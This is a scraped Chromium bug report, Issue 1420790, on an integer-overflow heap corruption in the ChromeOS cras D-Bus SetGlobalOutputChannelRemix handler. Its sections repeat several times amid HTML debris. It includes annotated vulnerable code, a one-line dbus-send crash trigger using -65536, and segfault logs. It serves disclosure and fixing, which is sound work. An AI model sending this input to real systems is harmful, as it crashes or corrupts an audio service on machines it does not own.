        though the commit (<span class="line"><!---->though the commit (<!----></span>https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<a class="undefined" target="_blank" href="https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723"><!---->https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<!----></a>)<span class="line"><!---->)<!----></span> fix the heap overflow, but I find a way to cause heap overflow<span class="line"><!----> fix the heap overflow, but I find a way to cause heap overflow<!----></span><br><br>in the function handle_set_global_output_channel_remix(<span class="line"><!---->in the function handle_set_global_output_channel_remix(<!----></span>https://source.chromium.org/chromiumos/chromiumos/codesearch/+/main:src/third_party/adhd/cras/src/server/cras_dbus_control.c;l=982;drc=4d04a9812a03c1fbe49a9b30a954f30344015773;bpv=0;bpt=1<a class="undefined" target="_blank" href="https://source.chromium.org/chromiumos/chromiumos/codesearch/+/main:src/third_party/adhd/cras/src/server/cras_dbus_control.c;l=982;drc=4d04a9812a03c1fbe49a9b30a954f30344015773;bpv=0;bpt=1"><!---->https://source.chromium.org/chromiumos/chromiumos/codesearch/+/main:src/third_party/adhd/cras/src/server/cras_dbus_control.c;l=982;drc=4d04a9812a03c1fbe49a9b30a954f30344015773;bpv=0;bpt=1<!----></a>)<span class="line"><!---->)<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>static DBusHandlerResult<span class="line"><!---->static DBusHandlerResult<!----></span><br>handle_set_global_output_channel_remix(DBusConnection *conn,<span class="line"><!---->handle_set_global_output_channel_remix(DBusConnection *conn,<!----></span><br>				       DBusMessage *message, void *arg)<span class="line"><!---->				       DBusMessage *message, void *arg)<!----></span><br>{<span class="line"><!---->{<!----></span><br>       .......................<span class="line"><!---->       .......................<!----></span><br>	if (!dbus_message_get_args(message, &dbus_error, DBUS_TYPE_INT32,<span class="line"><!---->	if (!dbus_message_get_args(message, &amp;dbus_error, DBUS_TYPE_INT32,<!----></span><br>				   &num_channels, DBUS_TYPE_ARRAY,         ---------------------->>>>we get num_channels as integer so we can set it to -65536<span class="line"><!---->				   &amp;num_channels, DBUS_TYPE_ARRAY,         ----------------------&gt;&gt;&gt;&gt;we get num_channels as integer so we can set it to -65536<!----></span><br>				   DBUS_TYPE_DOUBLE, &coeff_array, &count,<span class="line"><!---->				   DBUS_TYPE_DOUBLE, &amp;coeff_array, &amp;count,<!----></span><br>				   DBUS_TYPE_INVALID)) {<span class="line"><!---->				   DBUS_TYPE_INVALID)) {<!----></span><br>		syslog(LOG_WARNING, "Set global output channel remix error: %s",<span class="line"><!---->		syslog(LOG_WARNING, "Set global output channel remix error: %s",<!----></span><br>		       dbus_error.message);<span class="line"><!---->		       dbus_error.message);<!----></span><br>		dbus_error_free(&dbus_error);<span class="line"><!---->		dbus_error_free(&amp;dbus_error);<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br>	}<span class="line"><!---->	}<!----></span><br>	if (num_channels > CRAS_CH_MAX) {         ------------------------>> -65536 can pass it.<span class="line"><!---->	if (num_channels &gt; CRAS_CH_MAX) {         ------------------------&gt;&gt; -65536 can pass it.<!----></span><br>		syslog(LOG_WARNING,<span class="line"><!---->		syslog(LOG_WARNING,<!----></span><br>		       "Set global output channel remix error: num_channels[%d] exceeds %d",<span class="line"><!---->		       "Set global output channel remix error: num_channels[%d] exceeds %d",<!----></span><br>		       num_channels, CRAS_CH_MAX);<span class="line"><!---->		       num_channels, CRAS_CH_MAX);<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br>	}<span class="line"><!---->	}<!----></span><br><br>	if (num_channels * num_channels != count) {          ------------------------------>>> -65536 * -65536 = 0 (int32)    so we can pass the check with the empty array<span class="line"><!---->	if (num_channels * num_channels != count) {          ------------------------------&gt;&gt;&gt; -65536 * -65536 = 0 (int32)    so we can pass the check with the empty array<!----></span><br>		syslog(LOG_WARNING,<span class="line"><!---->		syslog(LOG_WARNING,<!----></span><br>		       "Set global output channel remix error: Invalid argument, coeff_array size[%d] != num_channels[%d]*num_channels[%d]",<span class="line"><!---->		       "Set global output channel remix error: Invalid argument, coeff_array size[%d] != num_channels[%d]*num_channels[%d]",<!----></span><br>		       count, num_channels, num_channels);<span class="line"><!---->		       count, num_channels, num_channels);<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br>	}<span class="line"><!---->	}<!----></span><br><br>	coefficient = (float *)calloc(count, sizeof(*coefficient));   it will calloc(0)<span class="line"><!---->	coefficient = (float *)calloc(count, sizeof(*coefficient));   it will calloc(0)<!----></span><br>	if (!coefficient)<span class="line"><!---->	if (!coefficient)<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br><br>	for (i = 0; i < count; i++)<span class="line"><!---->	for (i = 0; i &lt; count; i++)<!----></span><br>		coefficient[i] = coeff_array[i];<span class="line"><!---->		coefficient[i] = coeff_array[i];<!----></span><br><br>	audio_thread_config_global_remix(cras_iodev_list_get_audio_thread(),<span class="line"><!---->	audio_thread_config_global_remix(cras_iodev_list_get_audio_thread(),<!----></span><br>					 num_channels, coefficient);         -------------->> here num_channels will be converted to a uint32 value, will cause the heap overflow coeff_array<span class="line"><!---->					 num_channels, coefficient);         --------------&gt;&gt; here num_channels will be converted to a uint32 value, will cause the heap overflow coeff_array<!----></span><br><br>	send_empty_reply(conn, message);<span class="line"><!---->	send_empty_reply(conn, message);<!----></span><br>	free(coefficient);<span class="line"><!---->	free(coefficient);<!----></span><br>	return DBUS_HANDLER_RESULT_HANDLED;<span class="line"><!---->	return DBUS_HANDLER_RESULT_HANDLED;<!----></span><br>}<span class="line"><!---->}<!----></span><br>```<span class="line"><!---->```<!----></span><mr-comment-content></mr-comment-content>

        here is my suggest patch<span class="line"><!---->here is my suggest patch<!----></span><mr-comment-content></mr-comment-content>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users.             Issue 1420790: Security: ChromeOS cras D-Bus audio_thread_config_global_remix memory corruption
          <h1>
            
            Issue 1420790: Security: ChromeOS cras D-Bus audio_thread_config_global_remix memory corruption
          </h1>
          
            Reported by

      Steps to reproduce the problem:<b class="line"><!---->Steps to reproduce the problem:<!----></b><br>1.The cras D-Bus service has a method called SetGlobalOutputChannelRemix. The num_channels can be arbitrarily integer sent as a by an attacker. The handler for this method lives in cras_dbus_control.c, which will cause heap  overflow in cras<span class="line"><!---->1.The cras D-Bus service has a method called SetGlobalOutputChannelRemix. The num_channels can be arbitrarily integer sent as a by an attacker. The handler for this method lives in cras_dbus_control.c, which will cause heap  overflow in cras<!----></span><br>2.I test it in chromeos vm<span class="line"><!---->2.I test it in chromeos vm<!----></span><br>```<span class="line"><!---->```<!----></span><br>dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<span class="line"><!---->dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<!----></span><br>``<span class="line"><!---->``<!----></span><br>3.the /var/log/messages will show that <span class="line"><!---->3.the /var/log/messages will show that <!----></span><br>```<span class="line"><!---->```<!----></span><br>2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault at 0 ip 00005a922c51c0f2 sp 00007ffedb877590 error 4 in cras[5a922c506000+b7000]<span class="line"><!---->2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault at 0 ip 00005a922c51c0f2 sp 00007ffedb877590 error 4 in cras[5a922c506000+b7000]<!----></span><br>2023-03-01T17:20:02.251763Z INFO kernel: [ 4422.241569] Code: 45 89 e1 41 83 e1 03 41 ba 08 00 00 00 45 31 db 45 31 ed eb 15 0f 1f 00 49 ff c5 41 01 da 4d 01 e3 4d 39 e5 0f 84 76 01 00 00 <4e> 8b 04 e8 83 fb 0c 0f 83 a1 00 00 00 31 ff 49 89 fe 49 f7 d6 4d<span class="line"><!---->2023-03-01T17:20:02.251763Z INFO kernel: [ 4422.241569] Code: 45 89 e1 41 83 e1 03 41 ba 08 00 00 00 45 31 db 45 31 ed eb 15 0f 1f 00 49 ff c5 41 01 da 4d 01 e3 4d 39 e5 0f 84 76 01 00 00 &lt;4e&gt; 8b 04 e8 83 fb 0c 0f 83 a1 00 00 00 31 ff 49 89 fe 49 f7 d6 4d<!----></span><br><br><br>bitset:<span class="line"><!---->bitset:<!----></span><br>[1] <span class="line"><!---->[1] <!----></span>https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<a class="undefined" target="_blank" href="https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723"><!---->https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<!----></a><br><br>Problem Description:<b class="line"><!---->Problem Description:<!----></b><br>above all<span class="line"><!---->above all<!----></span><br><br>Additional Comments:<b class="line"><!---->Additional Comments:<!----></b><br><br><br>Chrome version: <b class="line"><!---->Chrome version: <!----></b>110.0.0.0 <span class="line"><!---->110.0.0.0 <!----></span>Channel: <b class="line"><!---->Channel: <!----></b>Not sure<span class="line"><!---->Not sure<!----></span><br><br>OS:<b class="line"><!---->OS:<!----></b>Chrome OS<span class="line"><!---->Chrome OS<!----></span><mr-comment-content></mr-comment-content>

        though the commit (<span class="line"><!---->though the commit (<!----></span>https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<a class="undefined" target="_blank" href="https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723"><!---->https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<!----></a>)<span class="line"><!---->)<!----></span> fix the heap overflow, but I find a way to cause heap overflow<span class="line"><!----> fix the heap overflow, but I find a way to cause heap overflow<!----></span><br><br>in the function handle_set_global_output_channel_remix(<span class="line"><!---->in the function handle_set_global_output_channel_remix(<!----></span>https://source.chromium.org/chromiumos/chromiumos/codesearch/+/main:src/third_party/adhd/cras/src/server/cras_dbus_control.c;l=982;drc=4d04a9812a03c1fbe49a9b30a954f30344015773;bpv=0;bpt=1<a class="undefined" target="_blank" href="https://source.chromium.org/chromiumos/chromiumos/codesearch/+/main:src/third_party/adhd/cras/src/server/cras_dbus_control.c;l=982;drc=4d04a9812a03c1fbe49a9b30a954f30344015773;bpv=0;bpt=1"><!---->https://source.chromium.org/chromiumos/chromiumos/codesearch/+/main:src/third_party/adhd/cras/src/server/cras_dbus_control.c;l=982;drc=4d04a9812a03c1fbe49a9b30a954f30344015773;bpv=0;bpt=1<!----></a>)<span class="line"><!---->)<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>static DBusHandlerResult<span class="line"><!---->static DBusHandlerResult<!----></span><br>handle_set_global_output_channel_remix(DBusConnection *conn,<span class="line"><!---->handle_set_global_output_channel_remix(DBusConnection *conn,<!----></span><br>				       DBusMessage *message, void *arg)<span class="line"><!---->				       DBusMessage *message, void *arg)<!----></span><br>{<span class="line"><!---->{<!----></span><br>       .......................<span class="line"><!---->       .......................<!----></span><br>	if (!dbus_message_get_args(message, &dbus_error, DBUS_TYPE_INT32,<span class="line"><!---->	if (!dbus_message_get_args(message, &amp;dbus_error, DBUS_TYPE_INT32,<!----></span><br>				   &num_channels, DBUS_TYPE_ARRAY,         ---------------------->>>>we get num_channels as integer so we can set it to -65536<span class="line"><!---->				   &amp;num_channels, DBUS_TYPE_ARRAY,         ----------------------&gt;&gt;&gt;&gt;we get num_channels as integer so we can set it to -65536<!----></span><br>				   DBUS_TYPE_DOUBLE, &coeff_array, &count,<span class="line"><!---->				   DBUS_TYPE_DOUBLE, &amp;coeff_array, &amp;count,<!----></span><br>				   DBUS_TYPE_INVALID)) {<span class="line"><!---->				   DBUS_TYPE_INVALID)) {<!----></span><br>		syslog(LOG_WARNING, "Set global output channel remix error: %s",<span class="line"><!---->		syslog(LOG_WARNING, "Set global output channel remix error: %s",<!----></span><br>		       dbus_error.message);<span class="line"><!---->		       dbus_error.message);<!----></span><br>		dbus_error_free(&dbus_error);<span class="line"><!---->		dbus_error_free(&amp;dbus_error);<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br>	}<span class="line"><!---->	}<!----></span><br>	if (num_channels > CRAS_CH_MAX) {         ------------------------>> -65536 can pass it.<span class="line"><!---->	if (num_channels &gt; CRAS_CH_MAX) {         ------------------------&gt;&gt; -65536 can pass it.<!----></span><br>		syslog(LOG_WARNING,<span class="line"><!---->		syslog(LOG_WARNING,<!----></span><br>		       "Set global output channel remix error: num_channels[%d] exceeds %d",<span class="line"><!---->		       "Set global output channel remix error: num_channels[%d] exceeds %d",<!----></span><br>		       num_channels, CRAS_CH_MAX);<span class="line"><!---->		       num_channels, CRAS_CH_MAX);<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br>	}<span class="line"><!---->	}<!----></span><br><br>	if (num_channels * num_channels != count) {          ------------------------------>>> -65536 * -65536 = 0 (int32)    so we can pass the check with the empty array<span class="line"><!---->	if (num_channels * num_channels != count) {          ------------------------------&gt;&gt;&gt; -65536 * -65536 = 0 (int32)    so we can pass the check with the empty array<!----></span><br>		syslog(LOG_WARNING,<span class="line"><!---->		syslog(LOG_WARNING,<!----></span><br>		       "Set global output channel remix error: Invalid argument, coeff_array size[%d] != num_channels[%d]*num_channels[%d]",<span class="line"><!---->		       "Set global output channel remix error: Invalid argument, coeff_array size[%d] != num_channels[%d]*num_channels[%d]",<!----></span><br>		       count, num_channels, num_channels);<span class="line"><!---->		       count, num_channels, num_channels);<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br>	}<span class="line"><!---->	}<!----></span><br><br>	coefficient = (float *)calloc(count, sizeof(*coefficient));   it will calloc(0)<span class="line"><!---->	coefficient = (float *)calloc(count, sizeof(*coefficient));   it will calloc(0)<!----></span><br>	if (!coefficient)<span class="line"><!---->	if (!coefficient)<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br><br>	for (i = 0; i < count; i++)<span class="line"><!---->	for (i = 0; i &lt; count; i++)<!----></span><br>		coefficient[i] = coeff_array[i];<span class="line"><!---->		coefficient[i] = coeff_array[i];<!----></span><br><br>	audio_thread_config_global_remix(cras_iodev_list_get_audio_thread(),<span class="line"><!---->	audio_thread_config_global_remix(cras_iodev_list_get_audio_thread(),<!----></span><br>					 num_channels, coefficient);         -------------->> here num_channels will be converted to a uint32 value, will cause the heap overflow coeff_array<span class="line"><!---->					 num_channels, coefficient);         --------------&gt;&gt; here num_channels will be converted to a uint32 value, will cause the heap overflow coeff_array<!----></span><br><br>	send_empty_reply(conn, message);<span class="line"><!---->	send_empty_reply(conn, message);<!----></span><br>	free(coefficient);<span class="line"><!---->	free(coefficient);<!----></span><br>	return DBUS_HANDLER_RESULT_HANDLED;<span class="line"><!---->	return DBUS_HANDLER_RESULT_HANDLED;<!----></span><br>}<span class="line"><!---->}<!----></span><br>```<span class="line"><!---->```<!----></span><mr-comment-content></mr-comment-content>

If so, please describe required testing.<!----></span><br>1. send commnad dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<span class="line"><!---->1. send commnad dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<!----></span><br>2. make sure /var/log/message don't show anything like 2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault<span class="line"><!---->2. make sure /var/log/message don't show anything like 2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault<!----></span><mr-comment-content></mr-comment-content>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. &lt;<!----></span>whalechang@google.com<a class="undefined" target="_blank" href="/u/whalechang@google.com"><!---->whalechang@google.com<!----></a>><span handle_set_global_output_channel_remix,<!----></span><br>If num_channels is negative number, it can pass the input parameter check.<span class="line"><!---->If num_channels is negative number, it can pass the input parameter check.<!----></span><br><br>Fix the problem by refusing negative number from dbus input.<span class="line"><!---->Fix the problem by refusing negative number from dbus input.<!----></span><br><br>BUG=chromium:1420790<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1420790" title="Security: ChromeOS cras D-Bus       Steps to reproduce the problem:<b class="line"><!---->Steps to reproduce the problem:<!----></b><br>1.The cras D-Bus service has a method called SetGlobalOutputChannelRemix. The num_channels can be arbitrarily integer sent as a by an attacker. The handler for this method lives in cras_dbus_control.c, which will cause heap  overflow in cras<span class="line"><!---->1.The cras D-Bus service has a method called SetGlobalOutputChannelRemix. The num_channels can be arbitrarily integer sent as a by an attacker. The handler for this method lives in cras_dbus_control.c, which will cause heap  overflow in cras<!----></span><br>2.I test it in chromeos vm<span class="line"><!---->2.I test it in chromeos vm<!----></span><br>```<span class="line"><!---->```<!----></span><br>dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<span class="line"><!---->dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<!----></span><br>``<span class="line"><!---->``<!----></span><br>3.the /var/log/messages will show that <span class="line"><!---->3.the /var/log/messages will show that <!----></span><br>```<span class="line"><!---->```<!----></span><br>2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault at 0 ip 00005a922c51c0f2 sp 00007ffedb877590 error 4 in cras[5a922c506000+b7000]<span class="line"><!---->2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault at 0 ip 00005a922c51c0f2 sp 00007ffedb877590 error 4 in cras[5a922c506000+b7000]<!----></span><br>2023-03-01T17:20:02.251763Z INFO kernel: [ 4422.241569] Code: 45 89 e1 41 83 e1 03 41 ba 08 00 00 00 45 31 db 45 31 ed eb 15 0f 1f 00 49 ff c5 41 01 da 4d 01 e3 4d 39 e5 0f 84 76 01 00 00 <4e> 8b 04 e8 83 fb 0c 0f 83 a1 00 00 00 31 ff 49 89 fe 49 f7 d6 4d<span class="line"><!---->2023-03-01T17:20:02.251763Z INFO kernel: [ 4422.241569] Code: 45 89 e1 41 83 e1 03 41 ba 08 00 00 00 45 31 db 45 31 ed eb 15 0f 1f 00 49 ff c5 41 01 da 4d 01 e3 4d 39 e5 0f 84 76 01 00 00 &lt;4e&gt; 8b 04 e8 83 fb 0c 0f 83 a1 00 00 00 31 ff 49 89 fe 49 f7 d6 4d<!----></span><br><br><br>bitset:<span class="line"><!---->bitset:<!----></span><br>[1] <span class="line"><!---->[1] <!----></span>https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<a class="undefined" target="_blank" href="https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723"><!---->https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<!----></a><br><br>Problem Description:<b class="line"><!---->Problem Description:<!----></b><br>above all<span class="line"><!---->above all<!----></span><br><br>Additional Comments:<b class="line"><!---->Additional Comments:<!----></b><br><br><br>Chrome version: <b class="line"><!---->Chrome version: <!----></b>110.0.0.0 <span class="line"><!---->110.0.0.0 <!----></span>Channel: <b class="line"><!---->Channel: <!----></b>Not sure<span class="line"><!---->Not sure<!----></span><br><br>OS:<b class="line"><!---->OS:<!----></b>Chrome OS<span class="line"><!---->Chrome OS<!----></span><mr-comment-content></mr-comment-content>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

      Steps to reproduce the problem:<b class="line"><!---->Steps to reproduce the problem:<!----></b><br>1.The cras D-Bus service has a method called SetGlobalOutputChannelRemix. The num_channels can be arbitrarily integer sent as a by an attacker. The handler for this method lives in cras_dbus_control.c, which will cause heap  overflow in cras<span class="line"><!---->1.The cras D-Bus service has a method called SetGlobalOutputChannelRemix. The num_channels can be arbitrarily integer sent as a by an attacker. The handler for this method lives in cras_dbus_control.c, which will cause heap  overflow in cras<!----></span><br>2.I test it in chromeos vm<span class="line"><!---->2.I test it in chromeos vm<!----></span><br>```<span class="line"><!---->```<!----></span><br>dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<span class="line"><!---->dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<!----></span><br>``<span class="line"><!---->``<!----></span><br>3.the /var/log/messages will show that <span class="line"><!---->3.the /var/log/messages will show that <!----></span><br>```<span class="line"><!---->```<!----></span><br>2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault at 0 ip 00005a922c51c0f2 sp 00007ffedb877590 error 4 in cras[5a922c506000+b7000]<span class="line"><!---->2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault at 0 ip 00005a922c51c0f2 sp 00007ffedb877590 error 4 in cras[5a922c506000+b7000]<!----></span><br>2023-03-01T17:20:02.251763Z INFO kernel: [ 4422.241569] Code: 45 89 e1 41 83 e1 03 41 ba 08 00 00 00 45 31 db 45 31 ed eb 15 0f 1f 00 49 ff c5 41 01 da 4d 01 e3 4d 39 e5 0f 84 76 01 00 00 <4e> 8b 04 e8 83 fb 0c 0f 83 a1 00 00 00 31 ff 49 89 fe 49 f7 d6 4d<span class="line"><!---->2023-03-01T17:20:02.251763Z INFO kernel: [ 4422.241569] Code: 45 89 e1 41 83 e1 03 41 ba 08 00 00 00 45 31 db 45 31 ed eb 15 0f 1f 00 49 ff c5 41 01 da 4d 01 e3 4d 39 e5 0f 84 76 01 00 00 &lt;4e&gt; 8b 04 e8 83 fb 0c 0f 83 a1 00 00 00 31 ff 49 89 fe 49 f7 d6 4d<!----></span><br><br><br>bitset:<span class="line"><!---->bitset:<!----></span><br>[1] <span class="line"><!---->[1] <!----></span>https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<a class="undefined" target="_blank" href="https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723"><!---->https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<!----></a><br><br>Problem Description:<b class="line"><!---->Problem Description:<!----></b><br>above all<span class="line"><!---->above all<!----></span><br><br>Additional Comments:<b class="line"><!---->Additional Comments:<!----></b><br><br><br>Chrome version: <b class="line"><!---->Chrome version: <!----></b>110.0.0.0 <span class="line"><!---->110.0.0.0 <!----></span>Channel: <b class="line"><!---->Channel: <!----></b>Not sure<span class="line"><!---->Not sure<!----></span><br><br>OS:<b class="line"><!---->OS:<!----></b>Chrome OS<span class="line"><!---->Chrome OS<!----></span><mr-comment-content></mr-comment-content>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

      Steps to reproduce the problem:<b class="line"><!---->Steps to reproduce the problem:<!----></b><br>1.The cras D-Bus service has a method called SetGlobalOutputChannelRemix. The num_channels can be arbitrarily integer sent as a by an attacker. The handler for this method lives in cras_dbus_control.c, which will cause heap  overflow in cras<span class="line"><!---->1.The cras D-Bus service has a method called SetGlobalOutputChannelRemix. The num_channels can be arbitrarily integer sent as a by an attacker. The handler for this method lives in cras_dbus_control.c, which will cause heap  overflow in cras<!----></span><br>2.I test it in chromeos vm<span class="line"><!---->2.I test it in chromeos vm<!----></span><br>```<span class="line"><!---->```<!----></span><br>dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<span class="line"><!---->dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<!----></span><br>``<span class="line"><!---->``<!----></span><br>3.the /var/log/messages will show that <span class="line"><!---->3.the /var/log/messages will show that <!----></span><br>```<span class="line"><!---->```<!----></span><br>2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault at 0 ip 00005a922c51c0f2 sp 00007ffedb877590 error 4 in cras[5a922c506000+b7000]<span class="line"><!---->2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault at 0 ip 00005a922c51c0f2 sp 00007ffedb877590 error 4 in cras[5a922c506000+b7000]<!----></span><br>2023-03-01T17:20:02.251763Z INFO kernel: [ 4422.241569] Code: 45 89 e1 41 83 e1 03 41 ba 08 00 00 00 45 31 db 45 31 ed eb 15 0f 1f 00 49 ff c5 41 01 da 4d 01 e3 4d 39 e5 0f 84 76 01 00 00 <4e> 8b 04 e8 83 fb 0c 0f 83 a1 00 00 00 31 ff 49 89 fe 49 f7 d6 4d<span class="line"><!---->2023-03-01T17:20:02.251763Z INFO kernel: [ 4422.241569] Code: 45 89 e1 41 83 e1 03 41 ba 08 00 00 00 45 31 db 45 31 ed eb 15 0f 1f 00 49 ff c5 41 01 da 4d 01 e3 4d 39 e5 0f 84 76 01 00 00 &lt;4e&gt; 8b 04 e8 83 fb 0c 0f 83 a1 00 00 00 31 ff 49 89 fe 49 f7 d6 4d<!----></span><br><br><br>bitset:<span 